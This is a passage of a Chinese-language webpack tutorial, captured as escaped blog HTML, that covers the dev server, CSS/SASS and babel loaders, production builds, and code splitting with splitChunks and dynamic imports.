lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Webpack tutorial&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后，这个应用程序就会被webpack的开发服务器运行。</p></li></ul><h3 id="webpack的开发服务器"><a href="#webpack的开发服务器" class="headerlink" title="webpack的开发服务器"></a>webpack的开发服务器</h3><p>在前面我们已经安装了webpack-dev-server。如果没有安装，先安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i webpack-dev-server --save-dev</span><br></pre></td></tr></table></figure><p>webpack-dev-server是用于开发的软件包。 配置完成后，我们可以启动本地服务器来提供文件。<br>要配置webpack-dev-server，打开package.json并添加一个“start”脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">   &quot;dev&quot;: &quot;webpack --mode development&quot;,</span><br><span class="line">   &quot;start&quot;: &quot;webpack-dev-server --mode development --open&quot;,</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><p>有了这个配置，我们就可以启动服务器了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure><p>您的默认浏览器应打开。 在浏览器的console中，您还应该看到一个script标签，其中插入了我们的main.js bundle：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-93ec23a605361da6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="webpack-与-loaders"><a href="#webpack-与-loaders" class="headerlink" title="webpack 与 loaders"></a>webpack 与 loaders</h3><p>loaders是第三方扩展程序，可帮助webpack处理各种文件扩展名。 例如，有用于CSS，图像或txt文件的loader。<br>在配置方面，webpack loader的配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.filename$&#x2F;,</span><br><span class="line">        use: [&quot;loader-b&quot;, &quot;loader-a&quot;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>相关配置以module开头。 在module内，我们在rules内配置一个或者多个loader。</p><p>对于每个我们要视为Module的文件，我们使用test 和use 进行配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    test: &#x2F;\.filename$&#x2F;,</span><br><span class="line">    use: [&quot;loader-b&quot;, &quot;loader-a&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test 告诉webpack： 请把这个文件当成一个module，use 则说明那些Loader 将被运用到这个文件</p><h3 id="webpack-与CSS"><a href="#webpack-与CSS" class="headerlink" title="webpack 与CSS"></a>webpack 与CSS</h3><p>要在webpack中处理CSS，我们需要安装至少两个loader。loaders 帮助webpack知道如何处理CSS<br>测试webpack中的CSS， 先定义一个简单的css文件src/style.css：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">h1 &#123;</span><br><span class="line">    color: orange;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后定义一个html文件src/index.html：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Webpack tutorial&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello webpack!&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>最后在在src/index.js中加载这个CSS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import &quot;.&#x2F;style.css&quot;;</span><br><span class="line">console.log(&quot;Hello webpack!&quot;);</span><br></pre></td></tr></table></figure><p>在测试之前，我们先安装处理css的loader：</p><ul><li>css-loader, 处理运用import来加载css文件</li><li>style-loader，处理在DOM中加载css<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i css-loader style-loader --save-dev</span><br></pre></td></tr></table></figure>然后在webpack.config.js中配置这些loader：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">const HtmlWebpackPlugin &#x3D; require(&quot;html-webpack-plugin&quot;);</span><br><span class="line">const path &#x3D; require(&quot;path&quot;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.css$&#x2F;,</span><br><span class="line">        use: [&quot;style-loader&quot;, &quot;css-loader&quot;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">      template: path.resolve(__dirname, &quot;src&quot;, &quot;index.html&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>相关的配置在module里面<br>现在跑<strong>npm start</strong>就可以在浏览器里面看到那些css在html的head里面加载了：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-245f034b6b11f722.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>如果css被minified， 可以通过MiniCssExtractPlugin展开css</li></ul><h3 id="Webpack中loaders的顺序很重要"><a href="#Webpack中loaders的顺序很重要" class="headerlink" title="Webpack中loaders的顺序很重要"></a>Webpack中loaders的顺序很重要</h3><p>在webpack中，加载程序在配置中出现的顺序非常重要。 以下配置无效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.css$&#x2F;,</span><br><span class="line">        use: [&quot;css-loader&quot;, &quot;style-loader&quot;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此处，“ style-loader”出现在“ css-loader”之前。 但是style-loader用于在页面中注入样式，而不是用于加载实际的CSS文件。</p><p>相反，以下配置有效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.css$&#x2F;,</span><br><span class="line">        use: [&quot;style-loader&quot;, &quot;css-loader&quot;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>webpack加载程序从右到左加载（或从上到下考虑）。</p><h3 id="Webpack与SASS"><a href="#Webpack与SASS" class="headerlink" title="Webpack与SASS"></a>Webpack与SASS</h3><p>要在Webpack中使用SASS，我们至少需要安装适当的loader。<br>此处的loader对于帮助webpack了解如何处理.scss文件是必需的。<br>要在webpack中测试SASS，请在src / style.scss中创建一个简单的样式表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@import url(&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;css?family&#x3D;Karla:weight@400;700&amp;display&#x3D;swap&quot;);</span><br><span class="line"></span><br><span class="line">$font: &quot;Karla&quot;, sans-serif;</span><br><span class="line">$primary-color: #3e6f9e;</span><br><span class="line"></span><br><span class="line">body &#123;</span><br><span class="line">  font-family: $font;</span><br><span class="line">  color: $primary-color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，在src / index.html中的HTML模板中添加更多HTML元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Webpack tutorial&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello webpack!&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;Hello sass!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>最后，将SASS文件加载到src / index.js中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import &quot;.&#x2F;style.scss&quot;;</span><br><span class="line">console.log(&quot;Hello webpack!&quot;);</span><br></pre></td></tr></table></figure><p>在测试页面之前，我们需要安装loader（以及Node.js的sass软件包）:<br>sass-loader 处理import加载 SASS 文件<br>css-loader 处理加载CSS文件作为模块<br>style-loader 用于在DOM中加载样式表<br>安装 loaders:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i css-loader style-loader sass-loader sass --save-dev</span><br></pre></td></tr></table></figure><p>然后在webpack.config.js中配置他们：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">const HtmlWebpackPlugin &#x3D; require(&quot;html-webpack-plugin&quot;);</span><br><span class="line">const path &#x3D; require(&quot;path&quot;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.scss$&#x2F;,</span><br><span class="line">        use: [&quot;style-loader&quot;, &quot;css-loader&quot;, &quot;sass-loader&quot;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">      template: path.resolve(__dirname, &quot;src&quot;, &quot;index.html&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>相关的配置仍然是以module开头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const HtmlWebpackPlugin &#x3D; require(&quot;html-webpack-plugin&quot;);</span><br><span class="line">const path &#x3D; require(&quot;path&quot;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.scss$&#x2F;,</span><br><span class="line">        use: [&quot;style-loader&quot;, &quot;css-loader&quot;, &quot;sass-loader&quot;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意loader的顺序（从右往左）， 第一个是sass-loader,第二个是css-loader,最后是style-loader.<br>现在运行npm-start,可以在html的head里面看到记载的样式：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-45ba6c47bc63aac3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>一旦安装了SASS和CSS loader，就可以使用MiniCssExtractPlugin展开CSS文件。</p><h3 id="Webpack与JavaScript"><a href="#Webpack与JavaScript" class="headerlink" title="Webpack与JavaScript"></a>Webpack与JavaScript</h3><p>webpack本身并不知道如何转换JavaScript代码。 该任务已外包给带有babel的第三方loader，特别是babel-loader. babel是一个JavaScript编译器和“转译器”。 给定现代JavaScript语法作为输入，babel可以将其转换为可以在（几乎）任何浏览器中运行的兼容代码。</p><p>在继续之前，我们需要安装一堆软件包：</p><ul><li>babel core，实际引擎</li><li>babel preset env，用于将现代Javascript编译为ES5</li><li>babel loader </li></ul><p>安装依赖项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i @babel&#x2F;core babel-loader @babel&#x2F;preset-env --save-dev</span><br></pre></td></tr></table></figure><p>然后通过创建一个新文件babel.config.json配置babel。 在这里，我们将babel配置 use preset-env：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;presets&quot;: [</span><br><span class="line">    &quot;@babel&#x2F;preset-env&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，配置webpack使用loader来转换JavaScript文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const HtmlWebpackPlugin &#x3D; require(&quot;html-webpack-plugin&quot;);</span><br><span class="line">const path &#x3D; require(&quot;path&quot;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.scss$&#x2F;,</span><br><span class="line">        use: [&quot;style-loader&quot;, &quot;css-loader&quot;, &quot;sass-loader&quot;]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.js$&#x2F;,</span><br><span class="line">        exclude: &#x2F;node_modules&#x2F;,</span><br><span class="line">        use: [&quot;babel-loader&quot;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">      template: path.resolve(__dirname, &quot;src&quot;, &quot;index.html&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>要测试转换，请在src / index.js中编写一些现代语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import &quot;.&#x2F;style.scss&quot;;</span><br><span class="line">console.log(&quot;Hello webpack!&quot;);</span><br><span class="line"></span><br><span class="line">const fancyFunc &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">  return [1, 2];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">const [a, b] &#x3D; fancyFunc();</span><br></pre></td></tr></table></figure><p>现在运行npm run dev来查看dist中转换后的代码。 打开<strong>dist / main.js</strong>并搜索“ fancyFunc”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\n\nvar fancyFunc &#x3D; function fancyFunc() &#123;\n  return [1, 2];\n&#125;;\n\nvar _fancyFunc &#x3D; fancyFunc(),\n    _fancyFunc2 &#x3D; _slicedToArray(_fancyFunc, 2),\n    a &#x3D; _fancyFunc2[0],\n    b &#x3D; _fancyFunc2[1];\n\n&#x2F;&#x2F;# sourceURL&#x3D;webpack:&#x2F;&#x2F;&#x2F;.&#x2F;src&#x2F;index.js?&quot;</span><br></pre></td></tr></table></figure><p>没有babel，代码将不会被转译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\n\nconsole.log(\&quot;Hello webpack!\&quot;);\n\nconst fancyFunc &#x3D; () &#x3D;&gt; &#123;\n  return [1, 2];\n&#125;;\n\nconst [a, b] &#x3D; fancyFunc();\n\n\n&#x2F;&#x2F;# sourceURL&#x3D;webpack:&#x2F;&#x2F;&#x2F;.&#x2F;src&#x2F;index.js?&quot;); </span><br></pre></td></tr></table></figure><p>注意：即使没有babel，webpack也可以正常工作。 仅在运输ES5时才需要进行代码转换过程。</p><h3 id="Webpack-中JavaScript模块"><a href="#Webpack-中JavaScript模块" class="headerlink" title="Webpack 中JavaScript模块"></a>Webpack 中JavaScript模块</h3><p>webpack将一些文件视为一个模块。 但是，我们不要忘记它的主要目的：加载ES模块。<br>直到2015年，JavaScript仍没有标准的代码重用机制。 已经进行了很多尝试来标准化这方面，这导致多年来混乱的碎片化。<br>您可能听说过AMD模块，UMD或Common JS。 没有明确的获胜者。 最后，在ECMAScript 2015中，ES模块以该语言发布。 现在，我们有了一个“官方”模块系统。<br>webpack中使用ES模块和模块化代码还是很方便的。<br>要试用webpack中的ES模块，使用以下代码在src / common / usersAPI.js的新文件中创建一个模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const ENDPOINT &#x3D; &quot;https:&#x2F;&#x2F;jsonplaceholder.typicode.com&#x2F;users&#x2F;&quot;;</span><br><span class="line"></span><br><span class="line">export function getUsers() &#123;</span><br><span class="line">  return fetch(ENDPOINT)</span><br><span class="line">    .then(response &#x3D;&gt; &#123;</span><br><span class="line">      if (!response.ok) throw Error(response.statusText);</span><br><span class="line">      return response.json();</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(json &#x3D;&gt; json);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，在src / index.js中，可以加载模块并使用以下功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import &#123; getUsers &#125; from &quot;.&#x2F;common&#x2F;usersAPI&quot;;</span><br><span class="line">import &quot;.&#x2F;style.scss&quot;;</span><br><span class="line">console.log(&quot;Hello webpack!&quot;);</span><br><span class="line"></span><br><span class="line">getUsers().then(json &#x3D;&gt; console.log(json));</span><br></pre></td></tr></table></figure><p><a href="https://www.valentinog.com/blog/es-modules/">ES 模块介绍</a></p><h3 id="Production-模式"><a href="#Production-模式" class="headerlink" title="Production 模式"></a>Production 模式</h3><p>如上所述，webpack具有两种操作模式：开发和生产。 到目前为止，我们仅在开发模式下工作。<br>在开发模式下，webpack接受我们编写的几乎所有原始JavaScript代码，并将其加载到浏览器中。<br>没有minify过。 这样可以更快地重新加载开发中的应用程序。</p><p>相反，在生产模式下，webpack进行了许多优化：</p><ul><li>使用TerserWebpackPlugin进行minify以减小bundle包的大小</li><li>使用ModuleConcatenationPlugin提升范围</li></ul><p>将<strong>process.env.NODE_ENV</strong>设置为“production”, 此环境变量对于在development或production模式中执行操作很有用。<br>要在生产模式下配置webpack，打开package.json并添加一个“ build”脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;dev&quot;: &quot;webpack --mode development&quot;,</span><br><span class="line">    &quot;start&quot;: &quot;webpack-dev-server --mode development --open&quot;,</span><br><span class="line">    &quot;build&quot;: &quot;webpack --mode production&quot;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>现在，在执行 <strong>“npm run build”</strong> 时, webpack将产生一个缩小的包。</p><h3 id="使用webpack进行代码拆分"><a href="#使用webpack进行代码拆分" class="headerlink" title="使用webpack进行代码拆分"></a>使用webpack进行代码拆分</h3><p>代码拆分是指针对以下方面的优化技术：</p><ul><li>避免产生很大的bundle 文件</li><li>避免依赖项重复</li></ul><p>webpack社区决定应用程序的初始bundle包的最大大小的限制为：<strong>200KB</strong>。 要了解为什么让bundle包的size小很重要，Google *”The Cost of JavaScript”*。</p><p>激活webpack中的代码拆分的主要方法有以下三种：</p><ul><li>定义多个entry point</li><li>使用 <strong>optimization.splitChunks</strong></li><li>动态import</li></ul><p>第一个基于多个entry point的技术适用于较小的项目，但从长远来看却无法扩展。 在这里，我们将仅关注<strong>optimization.splitChunks</strong>和动态import。</p><h3 id="使用Optimization-splitChunks进行代码拆分"><a href="#使用Optimization-splitChunks进行代码拆分" class="headerlink" title="使用Optimization.splitChunks进行代码拆分"></a>使用Optimization.splitChunks进行代码拆分</h3><p>假设一个使用Moment.js的JavaScript应用程序，Moment.js是当前流行的一个关于日期和时间的JS库。</p><p>将这个library安装在项目文件夹中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i moment</span><br></pre></td></tr></table></figure><p>现在清除<strong>src / index.js</strong>的内容，并在那里导入库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import moment from &quot;moment&quot;;</span><br></pre></td></tr></table></figure><p>运行<strong>npm run build</strong>，查看输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main.js    350 KiB       0  [emitted]  [big]  main</span><br></pre></td></tr></table></figure><p>整个库都bundle在我们应用程序的main entry point 中， 这样不好。 通过optimization.splitChunks，我们可以从main bundle中移出moment.js。</p><p>要配置代码拆分，打开webpack.config.js并将<strong>optimization</strong>添加到配置中，配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const HtmlWebpackPlugin &#x3D; require(&quot;html-webpack-plugin&quot;);</span><br><span class="line">const path &#x3D; require(&quot;path&quot;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">  &#x2F;&#x2F; omitted for brevity</span><br><span class="line">  &#125;,</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    splitChunks: &#123; chunks: &quot;all&quot; &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F; omitted for brevity</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>运行** npm run build**，查看输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">        main.js   5.05 KiB       0  [emitted]         main</span><br><span class="line">vendors~main.js    346 KiB       1  [emitted]  [big]  vendors~main</span><br></pre></td></tr></table></figure><p>现在，我们有了一个带有moment.js的vendors〜main.js，而main entry point 的大小更合理。</p><p><strong>注意</strong>：即使进行代码拆分，moment.js仍然是一个巨大的库。 还有更好的选择，如luxon或date-fns。</p><h3 id="使用动态import进行代码拆分"><a href="#使用动态import进行代码拆分" class="headerlink" title="使用动态import进行代码拆分"></a>使用动态import进行代码拆分</h3><p>一种更强大的代码拆分技术使用动态import有条件地加载代码。 在ECMAScript 2020中提供此功能之前，webpack就提供了动态导入。<br>这种方法在Vue和React之类的现代前端库中得到了广泛使用（React有其自己的方式，但是概念是相同的）。</p><p>代码拆分可能用在：</p><ul><li>在module级别</li><li>在route级别</li></ul><p>例如，可以有条件地加载一些JavaScript模块，以响应用户的交互（例如单击或鼠标移动）。 或者，您可以在响应路由更改时加载代码的相关部分。</p><p>要开始动态导入，清除<strong>src / index.html</strong>的内容，然后将以下html的内容放入其中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Dynamic imports&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;button id&#x3D;&quot;btn&quot;&gt;Load!&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>在<strong>src/common/usersAPI.js</strong>加入以下fetch模块代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const ENDPOINT &#x3D; &quot;https:&#x2F;&#x2F;jsonplaceholder.typicode.com&#x2F;users&#x2F;&quot;;</span><br><span 